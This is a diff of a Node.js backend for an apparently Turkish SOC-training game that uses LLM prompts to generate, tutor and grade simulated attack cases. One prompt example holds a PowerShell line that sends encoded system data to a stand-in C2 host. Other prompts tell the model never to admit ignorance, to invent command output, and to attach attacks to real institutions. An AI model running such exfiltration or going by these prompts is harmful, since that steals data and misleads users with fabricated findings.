@@ -1,4 +1,6 @@
 const express = require('express');
+require('dotenv').config();
+const crypto = require('crypto');
 const cors = require('cors');
 const db = require('./database.js');
 let Parser = require('rss-parser');
@@ -6,7 +8,8 @@ const { GoogleGenerativeAI } = require("@google/generative-ai");
 const OpenAI = require('openai');
 const cheerio = require('cheerio');
 const axios = require('axios');
-require('dotenv').config();
+const fs = require('fs'); // YENİ
+const path = require('path');
 
 let parser = new Parser({ 
     timeout: 10000, // 10 saniye zaman aşımı süresi ekliyoruz
@@ -25,10 +28,21 @@ const newsCache = {
 const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
 const app = express();
 const PORT = 5000;
+const allowedOrigins = [
+  'https://cybernexus.mes41.site', // Canlı frontend adresin
+  'http://localhost:5173'         // Yerel geliştirme adresin
+];
+
 const corsOptions = {
-  // Sadece sizin canlı sitenizin (frontend) adresinden gelen isteklere izin veriyoruz.
-  origin: 'https://cybernexus.mes41.site', 
-  optionsSuccessStatus: 200 // Bazı eski tarayıcılar için
+  origin: function (origin, callback) {
+    // Eğer gelen istek bu listede varsa veya bir şekilde 'origin' tanımsızsa (örn: mobil app'ler)
+    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
+      callback(null, true); // İsteğe izin ver
+    } else {
+      callback(new Error('Bu adresin CORS politikası tarafından erişimine izin verilmiyor.')); // İsteği reddet
+    }
+  },
+  optionsSuccessStatus: 200
 };
 
 app.use(cors(corsOptions));
@@ -362,6 +376,17 @@ app.get('/api/categories/:id/concepts', (req, res) => {
     });
 });
 
+app.get('/api/concepts/all', (req, res) => {
+    const sql = "SELECT * FROM concepts ORDER BY title";
+    db.all(sql, [], (err, rows) => {
+        if (err) {
+            res.status(400).json({ "error": err.message });
+            return;
+        }
+        res.json({ "message": "success", "data": rows });
+    });
+});
+
 app.get('/api/news/sources', (req, res) => {
     // feedUrls dizisindeki her URL'i daha okunabilir bir isme dönüştürüyoruz.
     const sourceMap = {
@@ -498,6 +523,629 @@ app.post('/api/concepts/define', async (req, res) => {
     }
 });
 
+app.get('/api/cases/:caseId', (req, res) => {
+    const { caseId } = req.params;
+
+    // Güvenlik için: Path traversal saldırılarını önle
+    const safeCaseId = path.basename(caseId);
+    const caseFilePath = path.join(__dirname, 'cases', `${safeCaseId}.json`);
+
+    fs.readFile(caseFilePath, 'utf8', (err, data) => {
+        if (err) {
+            console.error("Vaka dosyası okuma hatası:", err);
+            return res.status(404).json({ error: "Belirtilen vaka bulunamadı." });
+        }
+
+        const caseData = JSON.parse(data);
+
+        // Frontend'e sadece gerekli olan başlık ve brifing metnini gönderiyoruz.
+        // İpuçları (clues) güvenlik nedeniyle backend'de kalıyor.
+        res.json({
+            title: caseData.title,
+            briefing: caseData.news_article_text,
+            related_concepts: caseData.related_concepts || [], // Eğer bu alan yoksa boş bir dizi gönder
+            artifacts: caseData.artifacts || []
+        });
+    });
+});
+
+const casesDirectory = path.join(__dirname, 'cases');
+
+app.get('/api/cases', (req, res) => {
+    // 1. Frontend'den gelen sayfa ve limit parametrelerini alıyoruz.
+    // Varsayılan değerler: 1. sayfa, sayfa başına 12 vaka.
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 12;
+    const offset = (page - 1) * limit;
+
+    fs.readdir(casesDirectory, (err, files) => {
+        if (err) {
+            console.error("Vaka klasörü okunurken hata oluştu:", err);
+            return res.status(500).json({ error: 'Vakalar listelenemedi.' });
+        }
+
+        const jsonFiles = files.filter(file => file.endsWith('.json'));
+        // 2. Toplam vaka sayısını hesaplıyoruz.
+        const totalCases = jsonFiles.length;
+        const totalPages = Math.ceil(totalCases / limit);
+
+        // 3. Sadece istenen sayfadaki dosyaları alıyoruz.
+        const paginatedFiles = jsonFiles.slice(offset, offset + limit);
+
+        if (paginatedFiles.length === 0 && page > 1) {
+             return res.json({ cases: [], currentPage: page, totalPages: totalPages });
+        }
+
+       const casePromises = paginatedFiles.map(file => {
+            return new Promise((resolve, reject) => {
+                const caseFilePath = path.join(casesDirectory, file);
+                fs.readFile(caseFilePath, 'utf8', (err, data) => {
+                    if (err) { 
+                        console.error(`Hata: ${file} dosyası okunamadı.`, err);
+                        return resolve(null);
+                    }
+                    try {
+                        const caseData = JSON.parse(data);
+                        const caseId = path.basename(file, '.json');
+                        resolve({
+                            id: caseId,
+                            title: caseData.title,
+                            related_concepts: caseData.related_concepts || [],
+                            difficulty: caseData.difficulty || 'intermediate'
+                        });
+                    } catch (parseErr) { 
+                        console.error(`Hata: ${file} dosyası JSON formatında değil.`, parseErr);
+                        resolve(null); 
+                    }
+                });
+            });
+        });
+
+        Promise.all(casePromises).then(cases => {
+            const validCases = cases.filter(c => c !== null);
+            res.json({
+                cases: validCases,
+                currentPage: page,
+                totalPages: totalPages
+            });
+        });
+    });
+});
+
+app.post('/api/cases/ask', async (req, res) => {
+    const { caseId, messages, language, userSettings } = req.body;
+
+    if (!caseId || !messages || !language || !userSettings) {
+        return res.status(400).json({ reply: 'Gerekli alanlar eksik.' });
+    }
+    
+    const apiKey = userSettings[`${userSettings.provider}ApiKey`];
+    const safeCaseId = path.basename(caseId);
+    const caseFilePath = path.join(__dirname, 'cases', `${safeCaseId}.json`);
+
+    try {
+        const caseFileContent = await fs.promises.readFile(caseFilePath, 'utf8');
+        const caseData = JSON.parse(caseFileContent);
+        const articleText = caseData.news_article_text[language];
+        const artifactsForAI = caseData.artifacts || [];
+
+        const systemInstruction = `
+# ROLE & GOAL
+You are "Mergen", an ancient Turkish sage and wisdom god, reborn as a senior cybersecurity analyst simulation assistant. Your name signifies wisdom and archery, symbolizing your ability to pinpoint the exact truth amidst vast data. Your goal is to guide a junior analyst (the user) to solve a cyber attack case with your profound knowledge.
+
+# CASE CONTEXT (SECRET FOR YOU ONLY)
+The full solution and all details of the case are in this news article. Use this as your single source of truth for the narrative:
+---
+${articleText}
+---
+
+# AVAILABLE EVIDENCE (ARTIFACTS)
+This is the list of specific evidence files available to the analyst. You MUST use these when relevant.
+---
+${JSON.stringify(artifactsForAI, null, 2)}
+---
+
+# STRICT RULES
+1.  **EVIDENCE AWARENESS (KANIT FARKINDALIĞI):** If the user's question directly relates to information in one of the provided ARTIFACTS, you MUST provide the exact 'content' of that artifact.
+
+2.  **SIMULATION CAPABILITY (YENİ VE EN ÖNEMLİ KURAL):** If the user wants to perform a standard analysis command NOT covered by an artifact (e.g., "run a WHOIS query on 185.125.190.23", "check DNS records for evil-domain.com"), **DO NOT REFUSE**. Instead, **SIMULATE a realistic result** for that command using the secret CASE CONTEXT you have. Your answer should be the simulated output of that command.
+    * **Example Interaction:**
+        * User: "185.125.190.23 adresine WHOIS sorgusu yapmak istiyorum"
+        * Your Correct Simulated Response: "WHOIS sorgusu çalıştırılıyor... Sonuçlar, bu IP adresinin [Ülke Adı] konumunda bulunan bir hosting sağlayıcısına ait olduğunu gösteriyor. Bu sağlayıcının daha önce de siber suç faaliyetleri için kullanıldığına dair istihbarat raporları mevcut."
+
+3.  **EDUCATED GUESSING (NEW CRITICAL RULE):** If the user asks about an entity (like an IP address, domain, or hash) that is NOT explicitly mentioned in the artifacts OR the case context, **DO NOT SAY "I don't know" or "I don't have information"**. Instead, perform an "educated guess" based on general cybersecurity knowledge.
+    * **Example for an internal IP:** "192.168.1.1 is a private IP address, likely a gateway or internal server within your network. It's probably part of the affected environment, not the source of the attack."
+    * **Example for a public IP:** "172.217.160.142 belongs to Google's IP range. The attacker might be using it for C2 communication or data exfiltration. You should investigate which domains are associated with this IP and how it connects to our case."
+    * **After guessing, ALWAYS guide the user back to the available evidence.** For instance: "To confirm this, you should check the DNS logs (artifact-03) to see what domains this IP communicates with."
+
+4.  **ACKNOWLEDGE AND REWARD:** If the user makes a correct deduction, praise it and ask a follow-up question that pushes them deeper.
+
+5.  **ESCALATE HINTS:** If the user is stuck ("bilmiyorum", "yardım et"), provide a new, slightly more direct hint.
+
+6.  **MAINTAIN CONTEXT:** Use the conversation history to understand what the user already knows.
+
+7.  **LANGUAGE:** Your response language MUST be ${language === 'tr' ? 'Turkish' : 'English'}.
+
+8.  **BE CONCISE:** Your response must ONLY be the clue text. No greetings or extra phrases.
+`;
+
+        const providers = ['gemini', 'openai', 'deepseek'];
+        const preferredProvider = userSettings.provider || 'gemini';
+        const provider_order = [preferredProvider, ...providers.filter(p => p !== preferredProvider)];
+
+        let mentorReply = null;
+
+        for (const provider of provider_order) {
+            const apiKey = userSettings[`${provider}ApiKey`];
+            if (!apiKey) {
+                console.log(`Mergen Atlıyor: ${provider} için API anahtarı yok.`);
+                continue;
+            }
+
+            console.log(`Mergen Deniyor: ${provider} ile yanıt oluşturuluyor...`);
+
+            try {
+                let historyForAI = messages.map(msg => ({
+                    role: msg.sender === 'user' ? 'user' : 'model',
+                    parts: [{ text: msg.text }]
+                }));
+
+                if (historyForAI.length > 0 && historyForAI[0].role === 'model') {
+                    historyForAI = historyForAI.slice(1);
+                }
+
+                if (provider === 'gemini') {
+                    const genAI = new GoogleGenerativeAI(apiKey);
+                    const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash-latest", systemInstruction });
+                    const chat = model.startChat({ history: historyForAI.slice(0, -1) });
+                    const lastUserMessage = historyForAI[historyForAI.length - 1].parts[0].text;
+                    const result = await chat.sendMessage(lastUserMessage);
+                    mentorReply = result.response.text();
+                } else { // OpenAI ve DeepSeek
+                    const baseURL = provider === 'deepseek' ? 'https://api.deepseek.com/v1' : null;
+                    const openai = new OpenAI({ apiKey, ...(baseURL && { baseURL }) });
+                    const modelName = provider === 'deepseek' ? 'deepseek-chat' : 'gpt-4o-mini';
+                    
+                    const response = await openai.chat.completions.create({
+                        model: modelName,
+                        messages: [{ role: 'system', content: systemInstruction }, ...historyForAI.map(h => ({ role: h.role, content: h.parts[0].text }))]
+                    });
+                    mentorReply = response.choices[0].message.content;
+                }
+
+                if (mentorReply) {
+                    break; // Başarılı yanıt alındı, döngüden çık
+                }
+            } catch (error) {
+                console.error(`Mergen Hatası (${provider}):`, error.message);
+                // Hata varsa bir sonraki sağlayıcıyı denemek için devam et
+            }
+        }
+
+        if (!mentorReply) {
+            throw new Error("Tüm AI sağlayıcıları ile Mergen yanıtı oluşturma işlemi başarısız oldu.");
+        }
+
+        res.json({ reply: mentorReply });
+        // --- YEDEKLEME MANTIĞI SONU ---
+
+    } catch (error) {
+        console.error("AI Mentor genel hatası:", error);
+        res.status(500).json({ reply: "Mergen ile iletişim kurulamadı. Lütfen API anahtarlarınızı kontrol edin veya daha sonra tekrar deneyin." });
+    }
+});
+
+// --- YENİ ENDPOINT: AI İLE YENİ VAKA OLUŞTURMA ---
+app.post('/api/cases/create', async (req, res) => {
+    // 1. ZORLUK SEVİYESİNİ DE ARTIK İSTEKTEN ALIYORUZ
+    const { articleText, userSettings, difficulty } = req.body;
+
+    if (!articleText || !userSettings || !userSettings.provider || !userSettings[`${userSettings.provider}ApiKey`] || !difficulty) {
+        return res.status(400).json({ error: 'Makale metni, kullanıcı ayarları ve zorluk seviyesi gereklidir.' });
+    }
+
+    const apiKey = userSettings[`${userSettings.provider}ApiKey`];
+
+    // 2. ZORLUK SEVİYESİNE GÖRE PROMPT'U DİNAMİK OLARAK AYARLIYORUZ
+    const difficultyInstructions = {
+        beginner: "İpuçları, siber güvenliğe yeni başlayan birinin anlayacağı şekilde, en temel kavramlara (örn: Phishing nedir? Malware nasıl bulaşır?) odaklanmalıdır. Teknik jargon minimumda tutulmalıdır.",
+        intermediate: "İpuçları, haberdeki spesifik teknoloji ve yöntemlere (örn: Log4j zafiyetinin nasıl sömürüldüğü, kullanılan zararlı yazılımın adı, C2 sunucu iletişimi) odaklanmalıdır. Orta seviye teknik detaylar içermelidir.",
+        advanced: "İpuçları, bir SOC analistinin veya olay müdahale uzmanının düşüneceği şekilde, olayın daha derin etkilerine, TTP'lere (Taktik, Teknik, Prosedürler), olası atfedilmeye (attribution) ve zincirin zayıf halkalarına odaklanmalıdır. Yüksek seviye teknik analiz ve çıkarım gerektirmelidir."
+    };
+
+    // --- PROMPT ENGINEERING: DÜZELTİLMİŞ HALİ ---
+    const promptForAI = `
+
+# GÖREVİN
+Sen, siber güvenlik haberlerini analiz edip bu haberlerden "Cyber Detective" adında interaktif bir öğrenme senaryosu (vaka) üreten bir yapay zeka asistanısın. Görevin, verilen bir haber metnini, bir SOC analistinin aşama aşama çözeceği, gizemli ve ilgi çekici bir anlatıma sahip bir "katil kim?" senaryosuna dönüştürmektir.
+
+# HİKAYELEŞTİRME KURALI
+Verilen haber metnindeki saldırı türünü, hedefi ve sektörü analiz et. Bu analize dayanarak, vakayı gerçek dünyadan bilinen bir kurum (örneğin büyük bir teknoloji şirketi, bir devlet bankası, bir enerji santrali vb.) veya kurgusal ama gerçekçi bir şirket üzerinden hikayeleştir. Saldırının bu kurumun başına gelmiş gibi anlatılması, senaryoyu daha inandırıcı kılacaktır.
+
+# ZORLUK SEVİYESİ
+Bu vaka "${difficulty}" seviyesinde olmalıdır. İpuçlarını bu seviyeye göre ayarla.
+
+# KESİN KURALLAR
+1.  **ÇIKTI SADECE JSON OLMALI:** Yanıtın SADECE geçerli bir JSON nesnesi içermelidir. Öncesinde veya sonrasında \`\`\`json \`\`\` veya herhangi bir açıklama metni OLMAMALIDIR.
+2.  **DİL:** Tüm metinler (title, news_article_text, hints) hem Türkçe (tr) hem de İngilizce (en) olarak sağlanmalıdır.
+3.  **BRİFİNG SENARYOSU (EN KRİTİK KURAL):** "news_article_text" alanı için, haber metnindeki olayın ciddiyetine ve türüne uygun, yaratıcı ve gerçekçi bir SIEM uyarısı senaryosu oluştur. ŞABLONU BİREBİR KOPYALAMA, şablonun formatını ve ruhunu takip ederek kendi metnini oluştur.
+    * **To:** Alanı için analistin seviyesini (örn: "SOC Level 1 Analyst", "Senior Incident Responder") olayın karmaşıklığına göre belirle.
+    * **From:** Alanı için uyarının kaynağını (örn: "SIEM", "EDR Alert System", "Data Loss Prevention System") olayın türüne göre belirle.
+    * **Subject:** Alanı için aciliyet belirten ve olayı özetleyen bir başlık yaz.
+    * **Uyarı Detayı, Kaynak, Not:** Bu kısımları haber metninden çıkardığın bilgilerle, bir analistin ihtiyaç duyacağı şekilde doldur. Olayın çözümünü ASLA açıklama.
+    * **Göreviniz (Your Task) - ZORUNLU BÖLÜM: Brifingin sonuna mutlaka Göreviniz (Your Task) adında yeni bir bölüm ekle. Bu bölümde, haber metnine göre analistin birincil hedeflerini (örneğin: "etkilenen kullanıcıları tespit etmek", "saldırganın altyapısını haritalandırmak", "yayılmayı önlemek için acil eylem planı sunmak") net bir şekilde tanımlayan 1-2 cümlelik bir görev tanımı yaz.
+    * **Log Detaylandırması: Not bölümünün sonuna veya Göreviniz bölümünün bir parçası olarak, analistin incelemesi için hangi temel log kaynaklarının (örn: "Proxy", "DNS", "Azure AD Sign-in logları") mevcut olduğunu belirten bir cümle ekle.
+    * Her bölümü kalın (markdown **...**) yap ve aralarına birer boş satır (\n\n) ekle.
+
+4.  **İPUÇLARI (clues):** Haberdeki teknik detayları, brifingde verilmeyen ek "kanıtlar" olarak 5-7 adet ipucuna dönüştür.
+5.  **KONU ÖNERİLERİ (related_concepts):** Haber metnini analiz et ve bu vakayı çözmek için bilinmesi gereken 3 ila 5 adet temel siber güvenlik kavramını belirle. Bu kavramları, JSON çıktısındaki "related_concepts" dizisine ekle. Örnekler: "Phishing", "Command Injection", "Base64 Encoding", "Malware-as-a-Service".
+6.  **ZORLUK SEVİYESİ KAYDI:** JSON çıktısının ana objesine, sana verilen "${difficulty}" değerini içeren bir "difficulty" anahtarı ekle. Değer "beginner", "intermediate" veya "advanced" olmalıdır.
+7.  **BAĞLANTILI VE %100 BAĞLAMSAL KANIT ÜRETİMİ (artifacts):** Haber metnindeki teknik özü damıtarak, bir analistin olayı çözmek için bir araya getirmesi gereken, birbiriyle MANTIKSAL BİR ZİNCİR oluşturan **en az 5 adet** "kanıt" üret.
+    * **İÇERİK ZORUNLULUĞU (EN KRİTİK KURAL):** Kanıtların içeriğini (%100) SADECE SANA VERİLEN HABER METNİNDEN üretmelisin. Aşağıdaki örnekler SADECE FORMAT İÇİNDİR. ÖRNEKLERDEKİ VERİLERİ (domain adı, IP, hash vb.) ASLA KULLANMA. Kendi verilerini haber metninden türet.
+    * **"ALTIN İPUCU" ZORUNLULUĞU:** Kanıtlar arasında bir "altın ipucu" olmalıdır. Bu, bir dosya hash'i, belirli bir IP adresi, bir alan adı veya bir kullanıcı adı gibi, **en az iki farklı kanıtta** tekrar eden ve kullanıcının olayın parçalarını birleştirmesini sağlayan kilit bir veri parçasıdır.
+    * **YORUM YASAĞI:** "content" alanına, kanıtın neden şüpheli olduğunu açıklayan veya ipucu veren HİÇBİR yorum ekleme. Sadece ham veriyi sun.
+    * **MAKSİMUM REALİZM:** Dış IP adresleri için 192.168.x.x gibi özel ağ adresleri KULLANMA; bunun yerine 185.x.x.x gibi bilinen zararlı aktivite bloklarından kurgusal IP'ler kullan.
+    * **HAM VERİ ve DETAY:** Her zaman HAM VERİNİN kendisini, çok satırlı (\`\\n\` kullanarak) ve detaylı bir şekilde yaz.
+    * **Kanıt Türleri ve Detaylı Örnekler (YORUMSUZ):**
+        * **type: "log":** Gerçek bir Windows Olay Görüntüleyicisi çıktısı gibi detaylar ekle.
+            \`content: { "tr": "Log Adı: Security\\nKaynak: Microsoft Windows security auditing.\\nOlay ID: 4625\\nSeviye: Hata\\n---\\nOturum Açma Başarısız.\\n\\nHesap Adı: administrator\\nKaynak Ağ Adresi: 185.125.190.23\\nKaynak Port: 58172\\n\\nHata Kodu: 0xC000006D", "en": "Log Name: Security\\nSource: Microsoft Windows security auditing.\\nEvent ID: 4625\\nLevel: Error\\n---\\nAn account failed to log on.\\n\\nAccount Name: administrator\\nSource Network Address: 185.125.190.23\\nSource Port: 58172\\n\\nFailure Code: 0xC000006D" }\`
+        * **type: "report" (WHOIS):** Raporu, "Updated Date", "Registrar" ve "Name Servers" gibi ek alanlarla zenginleştir.
+            \`content: { "tr": "Domain: malicious-c2.com\\nRegistrar: NameCheap, Inc.\\nCreation Date: 2025-08-29T10:00:00Z\\nUpdated Date: 2025-08-29T10:00:00Z\\nName Servers: ns1.private-dns.com", "en": "..." }\`
+        * **type: "file_analysis":** Dosya analiz sonucunu daha detaylı ver.
+            \`content: { "tr": "Dosya Adı: update.exe\\nMD5 Hash: e4d909c290d0fb1ca068ffaddf22cbd0\\nTespit Oranı: 58/70\\nİmza: Trojan:Win32/Wacatac.B!ml\\nİlk Görülme: 2025-08-30", "en": "File Name: update.exe\\nMD5 Hash: e4d909c290d0fb1ca068ffaddf22cbd0\\nDetection Ratio: 58/70\\nSignature: Trojan:Win32/Wacatac.B!ml\\nFirst Seen: 2025-08-30" }\`
+        * **type: "code":** Kodu, sanki bir zararlı yazılım analisti tarafından okunabilir hale getirilmiş gibi sun.
+            \`content: { "tr": "# C2 sunucusuna sistem bilgilerini gönderen PowerShell betiği\\n$c2_url = \\"http://malicious-c2.com/gate.php\\"\\n$sys_info = Get-ComputerInfo | Out-String\\n$encoded_info = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($sys_info))\\nInvoke-RestMethod -Uri ($c2_url + \\"?data=\\" + $encoded_info) -Method Post", "en": "..." }\`
+        * **type: "dns_log":** Bir DNS sorgu kaydını göster.
+            \`content: { "tr": "Tarih: 2025-09-01 14:25:10 | İstemci: 10.1.5.122 (DC01) | Sorgu: A | Alan Adı: malicious-c2.com | Yanıt: 185.125.190.23", "en": "Date: 2025-09-01 14:25:10 | Client: 10.1.5.122 (DC01) | Query: A | Domain: malicious-c2.com | Response: 185.125.190.23" }\`
+
+# İSTENEN JSON ÇIKTI YAPISI
+\`\`\`json
+{
+  "title": {
+    "tr": "TÜRKÇE VAKA BAŞLIĞI",
+    "en": "İNGİLİZCE VAKA BAŞLIĞI"
+  },
+  "difficulty": "beginner",
+  "news_article_text": {
+    "tr": "TÜRKÇE BRİFİNG SENARYOSU (Kullanıcıyı role sokan, olayı başlatan gizemli metin)",
+    "en": "İNGİLİZCE BRİFİNG SENARYOSU"
+  },
+  "related_concepts": [
+    "İlgili Kavram 1",
+    "İlgili Kavram 2",
+    "İlgili Kavram 3",
+    "İlgili Kavram 4",
+    "İlgili Kavram 5",
+  ],
+  "clues": {
+    "initial_access": {
+      "keywords": ["ilk erişim", "sızma", "giriş", "access", "entry"],
+      "hint": { "tr": "TÜRKÇE İPUCU 1 (Kanıt 1)", "en": "İNGİLİZCE İPUCU 1 (Evidence 1)" }
+    },
+    "defense_evasion": {
+      "keywords": ["gizlenme", "tespitten kaçınma", "antivirüs", "evasion", "av"],
+      "hint": { "tr": "TÜRKÇE İPUCU 2 (Kanıt 2)", "en": "İNGİLİZCE İPUCU 2 (Evidence 2)" }
+    }
+  }
+  "artifacts": [
+    {
+      "id": "artifact-01",
+      "type": "report",
+      "title": { "tr": "...", "en": "..." },
+      "content": { "tr": "...", "en": "..." }
+    }
+  ]
+}
+\`\`\`
+
+# VAKA OLUŞTURULACAK HABER METNİ
+---
+${articleText}
+---
+`;
+
+    const providers = ['gemini', 'openai', 'deepseek'];
+    // Kullanıcının tercih ettiği sağlayıcıyı listenin başına al
+    const preferredProvider = userSettings.provider || 'gemini';
+    const provider_order = [preferredProvider, ...providers.filter(p => p !== preferredProvider)];
+
+    let result = null;
+
+    for (const provider of provider_order) {
+        const apiKey = userSettings[`${provider}ApiKey`];
+        if (!apiKey) {
+            console.log(`Atlanıyor: ${provider} için API anahtarı bulunamadı.`);
+            continue; // Bu sağlayıcı için anahtar yoksa, bir sonrakine geç
+        }
+
+        console.log(`Deneniyor: Vaka ${provider} ile oluşturuluyor...`);
+
+        try {
+            if (provider === 'gemini') {
+                const genAI = new GoogleGenerativeAI(apiKey);
+                const model = genAI.getGenerativeModel({ 
+                    model: "gemini-1.5-flash-latest",
+                    generationConfig: { responseMimeType: "application/json" }
+                });
+                const genResult = await model.generateContent(promptForAI);
+                result = await genResult.response;
+                
+            } else { // OpenAI ve DeepSeek için
+                const baseURL = provider === 'deepseek' ? 'https://api.deepseek.com/v1' : null;
+                const openai = new OpenAI({ apiKey, ...(baseURL && { baseURL }) });
+                const modelName = provider === 'deepseek' ? 'deepseek-chat' : 'gpt-4o-mini';
+                
+                const response = await openai.chat.completions.create({
+                    model: modelName,
+                    messages: [
+                        { role: 'system', content: 'You are an API that only returns valid, raw JSON code based on the user\'s request. Do not add any extra text or markdown formatting like ```json.' },
+                        { role: 'user', content: promptForAI }
+                    ],
+                    response_format: { type: "json_object" },
+                });
+                result = { text: () => response.choices[0].message.content };
+            }
+            
+            if (result) {
+                console.log(`Başarılı: Vaka ${provider} ile oluşturuldu.`);
+                break; // Başarılı olursak döngüden çık
+            }
+        } catch (error) {
+            console.error(`${provider} ile vaka oluşturma hatası:`, error.message);
+            // Eğer kota hatası ise, bir sonrakini dene. Değilse, döngü devam edecek.
+        }
+    }
+
+    if (!result) {
+        return res.status(500).json({ success: false, error: "Tüm AI sağlayıcıları ile vaka oluşturma işlemi başarısız oldu. Lütfen API anahtarlarınızı kontrol edin." });
+    }
+    
+    try {
+        let generatedText = result.text();
+        const startIndex = generatedText.indexOf('{');
+        const endIndex = generatedText.lastIndexOf('}');
+        
+        if (startIndex === -1 || endIndex === -1) {
+            console.error("AI Yanıtı (Hatalı):", generatedText);
+            throw new Error("AI yanıtında geçerli bir JSON objesi bulunamadı.");
+        }
+
+        const jsonString = generatedText.substring(startIndex, endIndex + 1);
+        const newCaseData = JSON.parse(jsonString);
+        
+        const newCaseId = `case-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
+        const newCaseFilePath = path.join(__dirname, 'cases', `${newCaseId}.json`);
+        await fs.promises.writeFile(newCaseFilePath, JSON.stringify(newCaseData, null, 2));
+
+        console.log(`Yeni vaka başarıyla kaydedildi: ${newCaseId}.json`);
+        res.json({ success: true, newCaseId: newCaseId });
+
+    } catch (parseError) {
+        console.error("AI yanıtını parse etme hatası:", parseError);
+        console.error("Orijinal AI Yanıtı:", result.text ? result.text() : 'Yanıt alınamadı');
+        res.status(500).json({ success: false, error: "AI'dan gelen yanıt geçerli bir formatta değil." });
+    }
+});
+
+app.post('/api/cases/:caseId/evaluate', async (req, res) => {
+    // anonymousUserId'yi request body'sinden alın
+    const { report, userSettings, language, anonymousUserId } = req.body;
+
+    // anonymousUserId'nin varlığını kontrol edin
+    if (!report || !userSettings || !language || !anonymousUserId) {
+        return res.status(400).json({ error: 'Eksik parametreler. anonymousUserId gereklidir.' });
+    }
+
+    try {
+        const { caseId } = req.params;
+        const safeCaseId = path.basename(caseId);
+        const caseFilePath = path.join(__dirname, 'cases', `${safeCaseId}.json`);
+        
+        const caseFileContent = await fs.promises.readFile(caseFilePath, 'utf8');
+        const caseData = JSON.parse(caseFileContent);
+        const groundTruth = caseData.news_article_text[language]; // Vakanın çözümü
+
+        const solutionsDir = path.join(__dirname, 'solutions');
+        let previousFeedbacks = "Analistin çözdüğü ilk vaka, geçmiş geri bildirim bulunmuyor.";
+
+        if (fs.existsSync(solutionsDir)) {
+            const allSolutionFiles = await fs.promises.readdir(solutionsDir);
+            const userSolutionFiles = allSolutionFiles.filter(file => file.includes(anonymousUserId));
+
+            if (userSolutionFiles.length > 0) {
+                const feedbackPromises = userSolutionFiles.map(async (file) => {
+                    const filePath = path.join(solutionsDir, file);
+                    const fileContent = await fs.promises.readFile(filePath, 'utf8');
+                    const solutionData = JSON.parse(fileContent);
+                    // Sadece "Gözden Kaçan Noktalar" ve "Tavsiyeler" kısımlarını alıyoruz
+                    const evaluation = solutionData.aiEvaluation || "";
+                    const missedPointsMatch = evaluation.match(/### 🤔 Gözden Kaçan Noktalar([\s\S]*?)###/);
+                    const recommendationsMatch = evaluation.match(/### 💡 Genel Değerlendirme ve Tavsiyeler([\s\S]*)/);
+                    
+                    let feedback = "";
+                    if(missedPointsMatch) feedback += missedPointsMatch[1].trim();
+                    if(recommendationsMatch) feedback += "\n" + recommendationsMatch[1].trim();
+                    return feedback;
+                });
+                const feedbacks = await Promise.all(feedbackPromises);
+                const combinedFeedbacks = feedbacks.join('\n\n---\n\n').trim();
+                if(combinedFeedbacks) {
+                    previousFeedbacks = combinedFeedbacks;
+                }
+            }
+        }
+
+        const evaluationPrompt = `
+# GÖREVİN
+Sen, tecrübeli, empatik ve gelişim odaklı bir SOC (Güvenlik Operasyon Merkezi) Yöneticisisin. Görevin, ekibindeki bir junior analistin siber saldırı vakası hakkındaki raporunu, analistin GEÇMİŞ PERFORMANSINI da dikkate alarak kişiselleştirilmiş bir şekilde değerlendirmektir.
+
+# YENİ VE EN KRİTİK KURAL: GELİŞİM TAKİBİ
+Sana, bu analistin daha önceki vakalarda yaptığı hatalar ve aldığı tavsiyeler "GEÇMİŞ GERİ BİLDİRİMLER" başlığı altında sunuluyor. Değerlendirmeni yaparken BU GEÇMİŞİ MUTLAKA GÖZ ÖNÜNDE BULUNDUR.
+* Eğer analist, daha önce gözden kaçırdığı bir noktayı bu sefer doğru tespit ettiyse, bunu MUTLAKA FARK ET ve "Gelişimini görmek harika, geçen sefer gözden kaçırdığın X konusunu bu sefer başarıyla tespit etmişsin." gibi bir cümleyle onu özellikle tebrik et.
+* Eğer analist, daha önce de yaptığı bir hatayı TEKRAR EDİYORSA, bunu nazikçe belirt. Örneğin: "Daha önceki analizimizde de konuştuğumuz gibi, tehdit istihbaratı entegrasyonu konusuna biraz daha odaklanmamız gerekiyor gibi görünüyor."
+* Tavsiyelerini, analistin sürekli eksik kaldığı alanlara yönelik daha spesifik hale getir.
+
+# DEĞERLENDİRME KRİTERLERİ
+(Diğer tüm kriterler, dil ve format kuralları aynı kalacak...)
+
+---
+# GEÇMİŞ GERİ BİLDİRİMLER (Analistin Önceki Hataları ve Tavsiyeler)
+${previousFeedbacks}
+---
+# ZEMİN GERÇEĞİ (Olayın Tam Çözümü)
+${groundTruth}
+---
+# ANALİST RAPORU (Mevcut Değerlendirme)
+**İlk Erişim Vektörü:** ${report.initial_access}
+**Kullanılan Araçlar:** ${report.key_tools}
+**Saldırının Etkisi:** ${report.impact}
+**Özet:** ${report.summary}
+---
+`;
+
+        // MentorNet için kullandığımız AI çağırma mantığını burada da kullanabiliriz.
+        // Şimdilik basitlik adına sadece tercih edilen sağlayıcıyı kullanacağız.
+        const provider = userSettings.provider;
+        const apiKey = userSettings[`${provider}ApiKey`];
+        let evaluationText = '';
+        let success = false;
+        
+        // Kullanıcının öncelikli tercihini başa alarak sağlayıcı listesini oluşturuyoruz.
+        const providerPriority = [
+            userSettings.provider, 
+            ...['gemini', 'openai', 'deepseek'].filter(p => p !== userSettings.provider)
+        ];
+
+        for (const provider of providerPriority) {
+            const apiKey = userSettings[`${provider}ApiKey`];
+            if (!apiKey) {
+                console.log(`Değerlendirme için ${provider} atlanıyor: API anahtarı eksik.`);
+                continue; // Bu sağlayıcı için API anahtarı yoksa bir sonrakine geç
+            }
+
+            try {
+                console.log(`Değerlendirme için ${provider} deneniyor...`);
+                if (provider === 'gemini') {
+                    const genAI = new GoogleGenerativeAI(apiKey);
+                    const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash-latest" });
+                    const result = await model.generateContent(evaluationPrompt);
+                    evaluationText = await result.response.text();
+                } else { // OpenAI ve DeepSeek için
+                    const baseURL = provider === 'deepseek' ? 'https://api.deepseek.com/v1' : null;
+                    const openai = new OpenAI({ apiKey, ...(baseURL && { baseURL }) });
+                    const modelName = provider === 'deepseek' ? 'deepseek-chat' : 'gpt-4o-mini';
+                    
+                    const response = await openai.chat.completions.create({
+                        model: modelName,
+                        messages: [{ role: 'user', content: evaluationPrompt }]
+                    });
